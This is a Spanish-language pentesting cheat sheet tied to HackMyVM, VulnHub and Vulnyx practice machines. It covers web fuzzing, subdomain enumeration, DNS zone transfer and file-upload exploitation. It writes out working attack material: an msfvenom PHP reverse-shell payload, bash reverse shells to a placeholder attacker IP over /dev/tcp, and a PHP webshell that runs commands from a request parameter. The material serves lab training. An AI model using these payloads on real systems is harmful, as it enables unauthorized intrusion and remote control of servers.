---
icon: '4'
---

# Explotación vulnerabilidades Web

## Qué es el Fuzzing Web – Uso de Gobuster

```bash
dirb http://<IP máquina víctima>
```

```bash
gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```

## Enumeración de Subdominios con Wfuzz

{% embed url="https://hackmyvm.eu/machines/machine.php?vm=Logan" %}

En ocasiones, es necesario editar el archivo `/etc/hosts` para asociar un dominio con la dirección IP de una máquina víctima (o servidor específico). Este archivo actúa como un mapa local de nombres de dominio a direcciones IP, permitiendo que las consultas de dominio se resuelvan localmente sin depender de DNS externos.

```bash
sudo nano /etc/hosts
<IP-de-la-máquina-víctima> <dominio-deseado>
```

#### Búsqueda de subdominios

```bash
wfuzz -c --hc=404 --hl=1 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.logan.hmv" -u <IP máquina víctima> 
```

> **Nota:** también hay que añadir lo que encontremos en el /etc/hosts&#x20;

## Cómo Hacer un Ataque de Transferencia de Zona DNS

{% embed url="https://vulnyx.com/#hunter" %}

Tenemos un dominio y el puerto 53 se puede realizar este ataque&#x20;

```bash
dig axfr <dominio> @<IP máquina víctima>
```

> **Nota**: también hay que añadir lo que encontremos en el /etc/hosts&#x20;

```bash
wfuzz -c --hc=404 --hl=367 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.<dominio>" -u <IP máquina víctima>
```

> **Nota**: también hay que añadir lo que encontremos en el /etc/hosts&#x20;

## Otras Herramientas Fuzzing Web – Uso de WFUZZ, DIRB y DIRSEARCH

{% embed url="https://vulnyx.com/#jenk" %}

```bash
wfuzz -c --hc 404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://<IP máquina víctima/FUZZ
```

```bash
dirb http://<IP máquina víctima>
```

```bash
dirsearch -u http://<IP máquina víctima>/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

## Explotación de vulnerabilidad File Upload

{% embed url="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141" %}

```bash
msfvenom -p php/reverse_tcp LHOST=<IP máquina atacante> LPORT=443 -f raw >pwned.php
```

Tenemos que ver siempre donde se subió por lo que realizamos el comando:

```bash
gobuster dir -u http://<IP máquina víctima>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Nos ponemos en escucha.

```bash
nc -nlvp 443
```

Nos mandamos la Reverse Shell. Por lo que nos ponemos en escucha otra vez.

```bash
nc -nlvp 4444
```

```bash
bash -c "sh -i >& /dev/tcp/<IP máquina atacante/4444 0>&1"
```

## Primeros pasos tras la Intrusión (Tratamiento de la TTY)

Al hacer la Reverse Shell tenemos que hacer los siguientes comandos para trabajar más cómodamente en la máquina víctima.

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## Obtener Intrusión a Servidor Mediante uso de una Webshell

Una Webshell es un archivo que se sube a un servidor para la ejecución remota de comandos.

```bash
<?php
   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Por lo que se podría hacer ahora.

```bash
http://<IP máquina víctima>/uploads/archivo.php?cmd=whoami
```

Para hacer URL una Reverse Shell en Burpuiste entrar en la opción de Decoder.

```bash
bash -c "bash -i>&/dev/tcp/<IP máquina atacante>/443 0>&1"
```

Tras esto dar a la opción **Encode as URL**.

```bash
http://<IP máquina víctima>/uploads/archivo.php?cmd=<URL encodeada>
```
